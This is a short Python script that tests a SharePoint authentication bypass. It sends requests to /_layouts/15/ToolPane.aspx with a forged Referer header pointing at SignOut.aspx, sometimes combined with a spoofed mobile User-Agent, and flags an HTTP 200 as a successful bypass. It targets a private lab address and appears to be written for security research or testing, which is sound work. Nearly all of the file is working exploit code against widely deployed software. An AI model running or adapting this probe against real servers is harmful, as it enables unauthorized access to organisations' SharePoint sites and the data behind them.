#!/usr/bin/env python3
"""
Test Referer header-based authentication bypass
Purpose: Test if Referer: /_layouts/SignOut.aspx bypasses authentication
"""
import requests

requests.packages.urllib3.disable_warnings()

def test_referer_bypass(target_url):
    """Test various Referer header values for auth bypass"""
    
    endpoint = f"{target_url}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx"
    
    test_cases = [
        {
            "description": "Original exploit headers (all combined)",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Referer": "/_layouts/SignOut.aspx",
            }
        },
        {
            "description": "Referer only",
            "headers": {
                "Referer": "/_layouts/SignOut.aspx",
            }
        },
        {
            "description": "Referer with full URL",
            "headers": {
                "Referer": f"{target_url}/_layouts/SignOut.aspx",
            }
        },
        {
            "description": "Referer: /_layouts/15/SignOut.aspx",
            "headers": {
                "Referer": "/_layouts/15/SignOut.aspx",
            }
        },
        {
            "description": "Mobile User-Agent only",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
            }
        },
    ]
    
    for test in test_cases:
        print(f"\n[*] Testing: {test['description']}")
        response = requests.get(endpoint, headers=test['headers'], verify=False, timeout=30)
        print(f"[*] Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"[!!!] SUCCESS - Auth bypassed with: {test['description']}")
            print(f"[*] Response length: {len(response.text)}")
            return True
        elif response.status_code == 302:
            print(f"[*] Redirect to: {response.headers.get('Location', 'N/A')}")
        else:
            print(f"[*] Still blocked (401)")
    
    return False

if __name__ == "__main__":
    target_url = "http://10.10.10.166"
    test_referer_bypass(target_url)
